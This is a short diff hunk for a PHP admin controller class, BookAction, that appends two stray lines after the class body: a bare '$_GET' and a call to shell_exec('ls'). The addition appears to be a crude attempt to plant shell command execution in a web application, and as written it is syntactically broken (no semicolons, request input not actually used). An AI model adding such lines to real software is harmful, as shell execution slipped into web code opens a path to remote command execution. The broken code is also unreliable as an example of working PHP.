@@ -60,4 +60,6 @@ class BookAction extends AdminAction{
         $this->smarty->display('Book/reply.html');
     }
 }
+$_GET
+shell_exec('ls')
 ?>
